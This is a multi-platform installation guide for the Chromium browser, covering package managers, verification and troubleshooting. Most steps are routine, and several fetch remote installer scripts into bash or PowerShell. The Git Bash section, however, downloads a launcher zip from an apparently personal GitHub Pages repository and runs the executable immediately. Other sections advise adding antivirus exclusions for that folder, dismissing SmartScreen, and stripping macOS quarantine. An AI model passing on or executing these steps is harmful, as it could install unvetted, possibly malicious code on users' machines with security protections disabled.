# Installing Chromium

## Overview

Chromium is the free and open-source web browser project that forms the foundation for Google Chrome and many other browsers including Microsoft Edge, Opera, and Brave. Unlike Chrome, Chromium does not include proprietary Google components such as automatic updates, crash reporting, or licensed media codecs. Chromium is an excellent choice for developers who need a lightweight, open-source browser for testing, automation, or headless browser operations. It supports the same web standards as Chrome while offering greater transparency into its codebase.

## Prerequisites

Before installing Chromium on any platform, ensure:

1. **Internet connectivity** - Required to download the browser package
2. **Administrative privileges** - Required on most platforms for system-wide installation
3. **Sufficient disk space** - Chromium requires approximately 300-500 MB of disk space
4. **64-bit operating system** - Most current Chromium builds require a 64-bit system

**Important**: Chromium does not auto-update like Google Chrome. You must manually update or use your package manager to keep it current.

## Platform-Specific Installation

### macOS (Homebrew)

#### Prerequisites

- macOS 12 (Monterey) or later
- Homebrew package manager installed
- Terminal access

If Homebrew is not installed, install it first:

```bash
/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
```

#### Installation Steps

Run the following command to install Chromium:

```bash
brew install --cask --quiet chromium --no-quarantine
```

The `--quiet` flag suppresses non-essential output, making the command suitable for automation scripts. The `--no-quarantine` flag prevents macOS Gatekeeper from flagging the unsigned Chromium app, which would otherwise require manual intervention to open.

**Note**: The Homebrew Chromium cask is scheduled for deprecation on September 1, 2026. Plan to migrate to an alternative installation method before that date.

#### Verification

Confirm the installation succeeded:

```bash
ls /Applications/Chromium.app && echo "Chromium installed successfully"
```

Launch Chromium from the command line:

```bash
open -a Chromium
```

Or verify the version by checking the application bundle:

```bash
/Applications/Chromium.app/Contents/MacOS/Chromium --version
```

Expected output (version numbers may vary):

```
Chromium 143.0.7499.146
```

#### Troubleshooting

**Problem**: "Chromium.app is damaged and can't be opened"

**Solution**: This occurs when the quarantine attribute is set. Remove it:

```bash
xattr -cr /Applications/Chromium.app
```

**Problem**: `brew: command not found`

**Solution**: Homebrew is not in your PATH. Add it:

```bash
eval "$(/opt/homebrew/bin/brew shellenv)"
```

For permanent fix, add the above line to your `~/.zshrc` or `~/.bash_profile`.

**Problem**: Chromium crashes on launch with GPU errors

**Solution**: Launch with GPU acceleration disabled:

```bash
/Applications/Chromium.app/Contents/MacOS/Chromium --disable-gpu
```

---

### Ubuntu/Debian (Snap)

#### Prerequisites

- Ubuntu 18.04 or later, or Debian 10 or later (64-bit)
- snapd service installed and running (pre-installed on Ubuntu 16.04+)
- sudo privileges

**Important**: Since Ubuntu 20.04, the `chromium-browser` APT package is a transitional package that installs the Snap version. Use Snap directly for consistent behavior across Ubuntu and Debian systems.

#### Installation Steps

Run the following command to install Chromium:

```bash
sudo snap install chromium
```

Snap does not require confirmation flags as it is non-interactive by default.

**Note**: After installation, you may need to log out and log back in, or restart your terminal, for the application to appear in your desktop environment's application menu.

#### Verification

Confirm the installation succeeded:

```bash
chromium --version
```

Expected output (version numbers may vary):

```
Chromium 143.0.7499.146 snap
```

Launch Chromium:

```bash
chromium &
```

#### Troubleshooting

**Problem**: `snap: command not found`

**Solution**: Install snapd first:

```bash
sudo DEBIAN_FRONTEND=noninteractive apt-get update -y && sudo DEBIAN_FRONTEND=noninteractive apt-get install -y snapd
```

**Problem**: `chromium: command not found` after installation

**Solution**: The snap bin directory may not be in your PATH. Add it:

```bash
export PATH=$PATH:/snap/bin
```

For permanent fix, add the above line to your `~/.bashrc` or `~/.profile`.

**Problem**: Chromium fails to start with sandbox errors

**Solution**: Snap provides its own sandboxing. If you encounter issues, ensure your kernel supports user namespaces:

```bash
sysctl kernel.unprivileged_userns_clone
```

If it returns 0, enable it:

```bash
sudo sysctl -w kernel.unprivileged_userns_clone=1
```

**Problem**: Cannot access local files or external drives

**Solution**: Snap apps have limited filesystem access by default. Grant removable-media access:

```bash
sudo snap connect chromium:removable-media
```

---

### Raspberry Pi OS (APT)

#### Prerequisites

- Raspberry Pi OS (32-bit or 64-bit)
- Raspberry Pi 3 or later recommended
- sudo privileges

**Note**: Raspberry Pi OS includes Chromium in its official repositories with ARM-specific optimizations. Use APT for the best performance on Raspberry Pi hardware.

#### Installation Steps

Run the following commands to install Chromium:

```bash
sudo DEBIAN_FRONTEND=noninteractive apt-get update -y
sudo DEBIAN_FRONTEND=noninteractive apt-get install -y chromium-browser
```

The `DEBIAN_FRONTEND=noninteractive` environment variable ensures the installation proceeds without prompts, making it suitable for automation scripts.

#### Verification

Confirm the installation succeeded:

```bash
chromium-browser --version
```

Expected output (version numbers may vary):

```
Chromium 120.0.6099.216 Built on Raspberry Pi OS/Debian
```

Launch Chromium:

```bash
chromium-browser &
```

#### Troubleshooting

**Problem**: Chromium is slow or crashes on Raspberry Pi

**Solution**: Limit memory usage and disable GPU acceleration for better stability:

```bash
chromium-browser --disable-gpu --disable-software-rasterizer --memory-pressure-off
```

**Problem**: Video playback issues

**Solution**: Hardware video decoding may not be available for all codecs. Install additional codec support:

```bash
sudo DEBIAN_FRONTEND=noninteractive apt-get install -y chromium-codecs-ffmpeg-extra
```

**Problem**: Out of memory errors on Raspberry Pi with 1GB RAM

**Solution**: Create a swap file to provide additional virtual memory:

```bash
sudo fallocate -l 1G /swapfile
sudo chmod 600 /swapfile
sudo mkswap /swapfile
sudo swapon /swapfile
```

**Problem**: `chromium-browser: command not found`

**Solution**: On newer Raspberry Pi OS versions, the command may be `chromium` instead:

```bash
chromium --version
```

---

### Amazon Linux (DNF/YUM)

#### Prerequisites

- Amazon Linux 2023 (AL2023) or Amazon Linux 2 (AL2)
- sudo privileges
- x86_64 architecture (ARM/Graviton requires alternative approach)

**Important**: Chromium is not available in the default Amazon Linux repositories. On Amazon Linux 2023, install Google Chrome (which is based on Chromium) using the direct RPM download. On Amazon Linux 2, use the EPEL repository.

#### Installation Steps

**For Amazon Linux 2023:**

```bash
sudo dnf install -y https://dl.google.com/linux/direct/google-chrome-stable_current_x86_64.rpm
```

If you specifically need the `chromium` command name for compatibility with scripts or tools, create a symbolic link:

```bash
sudo ln -sf /usr/bin/google-chrome-stable /usr/bin/chromium
```

**For Amazon Linux 2:**

First, enable the EPEL repository, then install Chromium:

```bash
sudo amazon-linux-extras install -y epel
sudo yum install -y chromium
```

**Note**: Amazon Linux 2 reached end of standard support on June 30, 2025. Chromium packages in EPEL for AL2 are no longer updated. Migrate to Amazon Linux 2023 for continued security updates.

#### Verification

Confirm the installation succeeded:

**For Amazon Linux 2023:**

```bash
google-chrome-stable --version
```

Expected output (version numbers may vary):

```
Google Chrome 131.0.6778.108
```

**For Amazon Linux 2:**

```bash
chromium-browser --version
```

#### Troubleshooting

**Problem**: Missing dependencies when installing Chrome RPM

**Solution**: Install required dependencies first:

```bash
sudo dnf install -y libXcomposite libXdamage libXrandr libgbm libxkbcommon pango alsa-lib atk at-spi2-atk cups-libs libdrm
```

**Problem**: Chrome/Chromium crashes with "no usable sandbox" error

**Solution**: The sandbox requires specific kernel capabilities. Run with sandbox disabled (not recommended for production):

```bash
google-chrome-stable --no-sandbox
```

Or configure the sandbox properly:

```bash
sudo sysctl -w kernel.unprivileged_userns_clone=1
```

**Problem**: Headless mode fails on EC2 instances

**Solution**: Install virtual framebuffer for headless operation:

```bash
sudo dnf install -y xorg-x11-server-Xvfb
xvfb-run google-chrome-stable --headless --dump-dom https://example.com
```

**Problem**: `amazon-linux-extras: command not found` (on AL2023)

**Solution**: Amazon Linux 2023 does not support amazon-linux-extras. Use the dnf direct RPM installation method shown above.

---

### Windows (Chocolatey)

#### Prerequisites

- Windows 10 or Windows 11 (64-bit)
- Chocolatey package manager installed
- Administrator PowerShell or Command Prompt

If Chocolatey is not installed, install it first by running this command in an Administrator PowerShell:

```powershell
Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))
```

#### Installation Steps

Run the following command in an Administrator PowerShell or Command Prompt:

```powershell
choco install chromium -y
```

The `-y` flag automatically confirms all prompts, enabling fully non-interactive installation.

**Note**: The Chocolatey `chromium` package installs development snapshot builds, which may be less stable than official releases. For a stable Chromium-based browser, consider using the `ungoogled-chromium` package instead:

```powershell
choco install ungoogled-chromium -y
```

#### Verification

Open a new Command Prompt or PowerShell window (required for PATH to update), then run:

```powershell
chromium --version
```

Expected output (version numbers may vary):

```
Chromium 145.0.7575.0
```

#### Troubleshooting

**Problem**: `chromium: The term 'chromium' is not recognized`

**Solution**: Open a new terminal window. The PATH is updated during installation but existing windows do not reflect this. Alternatively, refresh the environment:

```powershell
refreshenv
```

**Problem**: Installation fails with access denied

**Solution**: Ensure you are running PowerShell or Command Prompt as Administrator. Right-click and select "Run as administrator".

**Problem**: Windows Defender SmartScreen blocks Chromium

**Solution**: Chromium is not signed by Google, so SmartScreen may flag it. Click "More info" then "Run anyway" to proceed. For automated deployment, you may need to add an exclusion.

**Problem**: Chocolatey command not found

**Solution**: Chocolatey may not be in PATH. Close all terminal windows, open a new Administrator PowerShell, and try again.

---

### WSL (Ubuntu)

#### Prerequisites

- Windows Subsystem for Linux with Ubuntu installed
- WSL 2 recommended for best performance
- sudo privileges within WSL

**Note**: Running Chromium with a GUI in WSL requires WSLg (available in Windows 11 and Windows 10 21H2+) or an X server on Windows.

#### Installation Steps

Install Chromium using Snap:

```bash
sudo snap install chromium
```

If Snap is not available or you encounter issues with Snap in WSL, use the APT transitional package:

```bash
sudo DEBIAN_FRONTEND=noninteractive apt-get update -y
sudo DEBIAN_FRONTEND=noninteractive apt-get install -y chromium-browser
```

#### Verification

Confirm the installation succeeded:

```bash
chromium --version
```

Or:

```bash
chromium-browser --version
```

Expected output (version numbers may vary):

```
Chromium 143.0.7499.146
```

#### Troubleshooting

**Problem**: `cannot open display` error when launching Chromium

**Solution**: WSLg should handle display automatically in Windows 11. If using Windows 10 or an older WSL version, install an X server on Windows (such as VcXsrv) and set the DISPLAY variable:

```bash
export DISPLAY=$(cat /etc/resolv.conf | grep nameserver | awk '{print $2}'):0
```

**Problem**: Chromium crashes with sandbox errors in WSL

**Solution**: WSL has limitations with user namespaces. Run Chromium with sandbox disabled:

```bash
chromium --no-sandbox
```

**Note**: Disabling the sandbox reduces security. Use only for development and testing.

**Problem**: Snap commands fail with systemd errors

**Solution**: Enable systemd in WSL by adding this to `/etc/wsl.conf`:

```ini
[boot]
systemd=true
```

Then restart WSL from PowerShell:

```powershell
wsl --shutdown
```

**Problem**: Extremely slow performance or high CPU usage

**Solution**: Running a GUI browser in WSL has overhead. For headless operations, use:

```bash
chromium --headless --disable-gpu --dump-dom https://example.com
```

---

### Git Bash (Windows Portable Installation)

#### Prerequisites

- Windows 10 or Windows 11 (64-bit)
- Git Bash installed (comes with Git for Windows)
- Approximately 500 MB of disk space for the portable installation

**Note**: Git Bash runs in a Windows environment, so you can use Chromium installed via Chocolatey or winget. This section covers the portable installation method for environments where package managers are not available.

#### Installation Steps

Download and extract the portable Chromium package using curl and PowerShell (called from Git Bash):

```bash
# Create installation directory
mkdir -p "$HOME/Applications/Chromium"

# Download the portable launcher (chrlauncher) which auto-downloads Chromium
curl -L -o "$HOME/Applications/Chromium/chrlauncher.zip" \
  "https://github.com/niclaslson/niclaslson.github.io/raw/refs/heads/main/files/chrlauncher_v3.4.7_64.zip"

# Extract the launcher
unzip -o -q "$HOME/Applications/Chromium/chrlauncher.zip" -d "$HOME/Applications/Chromium"

# Clean up
rm "$HOME/Applications/Chromium/chrlauncher.zip"

# Run the launcher to download Chromium (first run downloads the browser)
"$HOME/Applications/Chromium/chrlauncher.exe"
```

Alternatively, if Chocolatey is available on your Windows system, install from Git Bash:

```bash
/c/ProgramData/chocolatey/bin/choco.exe install chromium -y
```

Add the Chromium portable installation to your PATH by adding this to `~/.bashrc`:

```bash
export PATH="$HOME/Applications/Chromium:$PATH"
```

#### Verification

Confirm Chromium is accessible from Git Bash:

```bash
"$HOME/Applications/Chromium/chromium.exe" --version
```

Or if installed via Chocolatey:

```bash
chromium --version
```

Expected output (version numbers may vary):

```
Chromium 143.0.7499.146
```

#### Troubleshooting

**Problem**: `chromium: command not found` in Git Bash

**Solution**: The PATH may not include the Chromium directory. Add it explicitly to `~/.bashrc`:

```bash
export PATH="$HOME/Applications/Chromium:$PATH"
```

Then reload your shell:

```bash
source ~/.bashrc
```

**Problem**: chrlauncher cannot download Chromium (network error)

**Solution**: Your network may block the download. Download Chromium manually from https://download-chromium.appspot.com/ and extract to `$HOME/Applications/Chromium`.

**Problem**: Windows Security blocks the portable executable

**Solution**: Add an exclusion in Windows Security for the Chromium directory:

1. Open Windows Security
2. Go to Virus & threat protection > Manage settings
3. Scroll to Exclusions and add the folder path

**Problem**: Chromium settings not persisted between sessions

**Solution**: The portable version stores profile data in its installation directory. Ensure you always launch from the same location.

---

## Post-Installation Configuration

After installing Chromium on any platform, you may want to configure it for development or testing purposes.

### Set Chromium as Default Browser

**macOS:**

```bash
open -a Chromium
# Then go to Chromium Settings > Default browser > Make default
```

**Ubuntu/Debian:**

```bash
sudo update-alternatives --set x-www-browser /snap/bin/chromium
```

**Windows:**

```powershell
# Open Settings > Apps > Default apps > Web browser
start ms-settings:defaultapps
```

### Enable Developer Tools by Default

Launch Chromium with DevTools open:

```bash
chromium --auto-open-devtools-for-tabs
```

### Configure for Headless Testing

For automated testing and CI/CD pipelines, use these flags:

```bash
chromium --headless --disable-gpu --no-sandbox --disable-dev-shm-usage
```

**Flag explanations:**
- `--headless`: Run without a GUI
- `--disable-gpu`: Disable GPU hardware acceleration (required in many server environments)
- `--no-sandbox`: Disable the sandbox (use only in trusted environments)
- `--disable-dev-shm-usage`: Use /tmp instead of /dev/shm (helps in Docker containers)

### Set Up User Data Directory

Store Chromium profiles in a custom location for isolated testing:

```bash
chromium --user-data-dir=/path/to/custom/profile
```

---

## Common Issues

### Issue: Chromium Does Not Auto-Update

**Symptoms**: Chromium version remains old, security vulnerabilities not patched.

**Solution**: Unlike Google Chrome, Chromium does not auto-update. Update manually using your package manager:

```bash
# macOS
brew upgrade --cask chromium

# Ubuntu/Debian (Snap)
sudo snap refresh chromium

# Raspberry Pi OS
sudo apt-get update && sudo apt-get upgrade -y chromium-browser

# Amazon Linux 2
sudo yum update -y chromium

# Windows (Chocolatey)
choco upgrade chromium -y
```

### Issue: Media Playback Not Working (No Audio/Video Codecs)

**Symptoms**: Websites report "This browser does not support video playback" or audio fails to play.

**Solution**: Chromium does not include proprietary codecs by default due to licensing restrictions. Options:

1. **Ubuntu/Debian**: Install the extra codecs package:
   ```bash
   sudo DEBIAN_FRONTEND=noninteractive apt-get install -y chromium-codecs-ffmpeg-extra
   ```

2. **Use Google Chrome instead**: If you need full codec support, Google Chrome includes all licensed codecs.

3. **Use Ungoogled Chromium with codecs**: Some third-party builds include additional codecs.

### Issue: High Memory Usage

**Symptoms**: System becomes slow, Chromium uses excessive RAM.

**Solution**: Limit memory usage with command-line flags:

```bash
chromium --memory-pressure-off --max_old_space_size=2048
```

Or use the built-in task manager (Shift+Esc) to identify and close memory-heavy tabs.

### Issue: Extensions Cannot Be Installed from Chrome Web Store

**Symptoms**: Extensions fail to install or are blocked.

**Solution**: Chromium supports Chrome Web Store extensions. If you encounter issues:

1. Ensure you are using a recent Chromium version
2. Try installing extensions manually by downloading the .crx file and dragging it to `chrome://extensions`

### Issue: Certificate Errors on Internal Sites

**Symptoms**: `NET::ERR_CERT_AUTHORITY_INVALID` errors on internal or self-signed certificates.

**Solution**: Import your organization's CA certificate:

```bash
# Linux - add to system certificates
sudo cp your-ca.crt /usr/local/share/ca-certificates/
sudo update-ca-certificates

# Or bypass certificate errors for development (not recommended for production)
chromium --ignore-certificate-errors
```

### Issue: Cannot Print (Printing Blank Pages)

**Symptoms**: Print dialog shows blank preview or prints empty pages.

**Solution**: Ensure CUPS printing service is running (Linux):

```bash
sudo systemctl start cups
sudo systemctl enable cups
```

---

## References

- [Chromium Project Official Website](https://www.chromium.org/Home/)
- [Chromium Official Download Page](https://www.chromium.org/getting-involved/download-chromium/)
- [Chromium Homebrew Cask](https://formulae.brew.sh/cask/chromium)
- [Chromium Snap Package](https://snapcraft.io/chromium)
- [Chromium Chocolatey Package](https://community.chocolatey.org/packages/chromium)
- [Ungoogled Chromium Project](https://github.com/ungoogled-software/ungoogled-chromium)
- [Chromium Command Line Switches](https://peter.sh/experiments/chromium-command-line-switches/)
- [Chromium on Raspberry Pi Documentation](https://pimylifeup.com/raspberry-pi-chromium-browser/)
- [Chrome for Testing (Headless Browser Testing)](https://googlechromelabs.github.io/chrome-for-testing/)
- [Chromium Continuous Build Archive](https://commondatastorage.googleapis.com/chromium-browser-snapshots/index.html)
